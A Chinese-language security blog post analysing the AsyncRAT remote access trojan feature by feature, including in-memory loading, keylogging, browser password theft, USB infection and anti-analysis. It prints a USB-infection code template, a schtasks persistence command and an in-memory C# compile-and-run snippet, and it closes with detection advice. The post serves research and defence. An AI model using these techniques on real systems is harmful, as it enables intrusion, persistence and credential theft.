---
layout: post
title: AsyncRAT利用分析
---


## 0x00 前言
---

[AsyncRAT](https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp)是一款使用C Sharp开发的C2工具，本文仅在技术研究的角度分析AsyncRAT的技术细节，介绍检测方法。

**注：**

本文选择的AsyncRAT更新日期为2020年5月9日

## 0x01 简介
---

- AsyncRAT的优点
- AsyncRAT的技术细节
- 检测方法

## 0x02 AsyncRAT的优点
---

[AsyncRAT](https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp)使用C Sharp开发，应用于Windows系统，具有以下优点:

1. 支持从Pastebin.com读取C2服务器的配置信息
2. 支持内存加载PE文件
3. 支持动态编译并执行C#或者VB代码
4. 支持U盘感染，能够感染U盘中所有使用.NET开发的exe文件
5. 支持自动读取Firefox和Chrome浏览器中保存的密码
6. 通过欺骗用户点击的方式绕过UAC进行提权
7. 通过C#接口技术，提高程序的扩展性，在程序实现上将每一个功能对应一个类，编译成dll文件，在需要加载的时候，由Server发送至Client，Client通过Activator.CreateInstance将类实例化，进而调用类的方法。


## 0x03 AsyncRAT的技术细节
---

本节按照AsyncRAT控制面板上的功能逐个进行分析，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-8-20/2-1.png)

### 1.SendFile

(1)ToMemory

内存加载exe文件，支持以下两种类型:

1. Reflection

使用Assembly.Load加载C#程序

更多细节可参考之前的文章[《从内存加载.NET程序集(Assembly.Load)的利用分析》](https://3gstudent.github.io/3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(Assembly.Load)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/)

2. RunPE

通过替换进程内存的方式加载exe文件

可选择以下程序作为被注入的程序：

- aspnet_compiler.exe
- RegAsm.exe
- MSBuild.exe
- RegSvcs.exe
- vbc.exe

**注：**

以上5个exe文件位于Microsoft.NET Framework的安装目录，同AsyncClient.exe的位数保持一致

使用32位的AsyncClient.exe反弹回的Session，默认会寻找32位Microsoft.NET Framework的安装目录，例如：C:\Windows\Microsoft.NET\Framework\v4.0.30319

使用64位的AsyncClient.exe反弹回的Session，默认会寻找64位Microsoft.NET Framework的安装目录，例如：C:\Windows\Microsoft.NET\Framework64\v4.0.30319

RunPE操作将启动以上5个exe文件中的一个，通过ReadProcessMemory、VirtualAllocEx、WriteProcessMemory和ResumeThread实现对进程内存的修改，替换成要加载的exe文件

这里需要注意要加载的exe文件需要同AsyncClient.exe的位数保持一致

使用32位的AsyncClient.exe反弹回的Session，使用RunPE操作只能加载32位的exe文件

使用64位的AsyncClient.exe反弹回的Session，使用RunPE操作只能加载64位的exe文件

更多细节可参考之前的文章[《傀儡进程的实现与检测》](https://3gstudent.github.io/3gstudent.github.io/%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%A3%80%E6%B5%8B/)


(2)ToDisk

将exe文件上传到目标主机的`%Temp%`目录，重命名为随机字符串，再使用Powershell启动exe文件，执行后不会删除`%Temp%`目录下的exe文件


### 2. Monitoring

(1)Remote Desktop

监控屏幕，实时获得目标桌面的内容(只能监控，无法操作)

调用Graphics类的CopyFromScreen实现屏幕截图

通过Python实现监控屏幕的细节可参考之前的文章[《Pupy利用分析——Windows平台下的屏幕控制》](https://3gstudent.github.io/3gstudent.github.io/Pupy%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90-Windows%E5%B9%B3%E5%8F%B0%E4%B8%8B%E7%9A%84%E5%B1%8F%E5%B9%95%E6%8E%A7%E5%88%B6/)

(2)Keylogger

实时获得目标主机键盘输入的消息和进程名称

通过hook的方式实现键盘记录

(3)Password Recovery

获得Firefox和Chrome浏览器中保存的密码

技术细节可参考之前的文章[《渗透技巧——导出Firefox浏览器中保存的密码》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAFirefox%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/)和[《渗透技巧——导出Chrome浏览器中保存的密码》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/)

(4)File Manager

文件管理，还支持隐蔽安装7zip和对文件的压缩及解压缩

隐蔽安装7zip的方式：

在`%Temp%`目录新建文件夹7-Zip，释放文件7z.exe和7z.dll

(5)Process Manager

进程管理，支持查看进程和关闭进程

(6)Report Window

监控重要进程，当目标主机上运行指定进程时，控制端弹出提示消息

(7)Webcam

开启摄像头

### 3.Miscellaneous

(1)Bots Killer

清除自身进程在注册表HKLM和HKCU下`\Software\Microsoft\Windows\CurrentVersion\Run`和`Software\Microsoft\Windows\CurrentVersion\RunOnce`保存的项

(2)USB Spread

当目标主机连接U盘时，感染U盘中的文件

将木马客户端复制到U盘中并隐藏，默认保存的名称为LimeUSB.exe

修改U盘中所有使用.NET开发的exe文件，通过CSharpCodeProvider改变程序运行流程，添加以下代码：

```
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

[assembly: AssemblyTrademark("%Lime%")]
[assembly: Guid("%Guid%")]

static class %LimeUSBModule%
{
    public static void Main()
    {
        try
        {
            System.Diagnostics.Process.Start(@"%File%");
        }
        catch { }
        try
        {
            System.Diagnostics.Process.Start(@"%Payload%");
        }
        catch { }
    }
}
```

用户在启动正常文件的同时会隐蔽执行U盘中的木马客户端


(3)Seed Torrent

向目标主机发送种子文件并下载

目标主机需要安装uTorrent或者BitTorrent

(4)Remote Shell

弹出一个交互式的cmd窗口

(5)DOS Attack

向指定域名持续发送HTTP数据包


(6)Execute .NET Code

在目标主机上动态编译C#或者VB代码并执行

模板文件包含弹框和下载执行的功能

我提取出了其中编译C#代码并执行的功能，代码示例如下：

```
using System;
using System.CodeDom;
using System.CodeDom.Compiler;
using System.Reflection;
namespace CodeDomProviderTest
{
    class Program
    {
        static void Main(string[] args)
        {
            string source = @"
using System;
using System.Windows.Forms;
namespace AsyncRAT
{
    public class Program
    {
        public static void Main(string[] args)
        {
            try
            {
                MessageBox.Show(""Hello World"");
            }
            catch { }
        }
}
}";
            CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider("CSharp");  
            try
            {              
                var compilerOptions = "/target:winexe /platform:anycpu /optimize-";

                var compilerParameters = new CompilerParameters();
                compilerParameters.ReferencedAssemblies.Add("system.dll");
                compilerParameters.ReferencedAssemblies.Add("system.windows.forms.dll");
                compilerParameters.GenerateExecutable = true;
                compilerParameters.GenerateInMemory = true;
                compilerParameters.CompilerOptions = compilerOptions;
                compilerParameters.TreatWarningsAsErrors = false;
                compilerParameters.IncludeDebugInformation = false;

                var compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, source);
                if (compilerResults.Errors.Count > 0)
                {
                    foreach (CompilerError compilerError in compilerResults.Errors)
                    {
                        Console.WriteLine(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                            compilerError.Line, compilerError.Column, compilerError.FileName));
                        break;
                    }
                }
                else
                {
                    Assembly assembly = compilerResults.CompiledAssembly;
                    MethodInfo methodInfo = assembly.EntryPoint;
                    object injObj = assembly.CreateInstance(methodInfo.Name);
                    object[] parameters = new object[1];
                    if (methodInfo.GetParameters().Length == 0)
                    {
                        parameters = null;
                    }
                    methodInfo.Invoke(injObj, parameters);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}
```

(7)Files Searcher

搜索指定后缀名的文件并打包成zip文件

### 4.Extra

(1)Visit Website

启动默认浏览器并访问指定URL，界面不隐藏

(2)Send MessageBox

在目标主机上弹出对话框

(3)Chat

在目标主机上弹出对话框，实时显示输入的内容


(4)Get Admin Privileges

使用cmd.exe以Admin权限重新启动木马客户端，这个操作会在用户桌面弹出UAC框，需要用户选择允许后才能运行

如果用户未选择允许，会一直弹出UAC对话框

UAC对话框的程序位置会暴露木马客户端的路径

如果想要伪造一个更加可信的UAC对话框(不暴露程序位置)可以参考之前文章《A dirty way of tricking users to bypass UAC》中的思路

(5)Blank Screen

Run功能：

通过WinAPI CreateDesktop()创建一个随机名称的虚拟桌面，内容为空，当切换到这个空的虚拟桌面时，用户无法对桌面进行操作

Stop功能：

通过WinAPI SwitchDesktop()切换到原来的桌面

(6)Disable Windows Defender

通过修改注册表的方式关闭Windows Defender，通常在Win10系统上使用

(7)Set Wallpaper

设置用户的桌面


### 5.Server

Block Clients

拒绝指定IP回连的木马客户端


### 6.Builder

(1)Connection

DNS：指定C2 Server的IP，可以设置多个

Port：指定C2 Server的端口，可以设置多个

Pastebin：从Pastebin.com读取C2 Server的信息，包括DNS和Port

内容示例：

```
127.0.0.1:6606:7707:8808
```

(2)Install

用作配置木马客户端自启动的功能

开启这个功能后会将木马客户端复制到指定位置

文件名称可以重新命名

文件路径可选择`%AppData%`或`%Temp%`目录

当木马客户端以普通用户权限执行时，会在注册表`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`添加项，以新的木马客户端名称作为注册表项的名称，以新的木马客户端路径作为注册表项的数据

当木马客户端以管理员权限执行时，会使用schtasks命令创建计划任务，命令示例：

```
schtasks /create /f /sc onlogon /rl highest /tn <name> /tr <path>
```

计划任务的名称为新的木马客户端名称，会在用户登录时执行计划任务

(3)Misc

Group：对木马客户端进行分类

Mutex：设置互斥量，避免木马客户端的重复启动

Anti Analysis：

包括以下功能：

- DetectManufacturer，通过WMI获得系统信息(`Select * from Win32_ComputerSystem`)，查看Manufacturer是否包含字符VIRTUAL、vmware或VirtualBox
- DetectDebugger，使用WinApi CheckRemoteDebuggerPresent()检查是否为调试器
- DetectSandboxie，使用WinApi GetModuleHandle()检查SbieDll.dll是否存在
- IsSmallDisk，检查硬盘大小是否小于60Gb
- IsXP，检查系统名称是否包含字符xp
            
Process Critica：

将进程设置为保护进程，如果意外关闭了保护进程，那么将导致BSOD

更多细节可参考之前的文章[《结束进程导致BSOD的利用分析》](https://3gstudent.github.io/3gstudent.github.io/%E7%BB%93%E6%9D%9F%E8%BF%9B%E7%A8%8B%E5%AF%BC%E8%87%B4BSOD%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/)

Delay：延迟执行的时间

(4)Assembly

可以手动设置文件属性，也可以复制指定文件的文件属性

(5)Icon

设置文件图标

(6)Build

Simple Obfuscator：通过重命名的方式实现简单的混淆

关键代码：

```
       private static ModuleDefMD RenamingObfuscation(ModuleDefMD inModule)
        {
            ModuleDefMD module = inModule;
            IRenaming rnm = new NamespacesRenaming();
            module = rnm.Rename(module);
            rnm = new ClassesRenaming();
            module = rnm.Rename(module);
            rnm = new MethodsRenaming();
            module = rnm.Rename(module);
            rnm = new PropertiesRenaming();
            module = rnm.Rename(module);
            rnm = new FieldsRenaming();
            module = rnm.Rename(module);
            return module;
        }
    }
```

## 0x04 检测方法
---

1.查找可疑文件

路径：`%AppData%`和`%Temp%`目录


2.使用Autoruns检查可疑的启动项

(1)注册表位置

- HKLM\Software\Microsoft\Windows\CurrentVersion\Run
- HKCU\Software\Microsoft\Windows\CurrentVersion\Run

(2)计划任务列表

3.后台可疑进程

AsyncRAT的木马客户端只有exe文件一种形式，在运行时会产生可疑的进程

4.通信流量

查看可疑进程对外通信流量

5.使用杀毒软件

目前杀毒软件均会对AsyncRAT进行拦截

## 0x05 小结
---

本文在技术研究的角度分析AsyncRAT的技术细节，介绍检测方法。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)

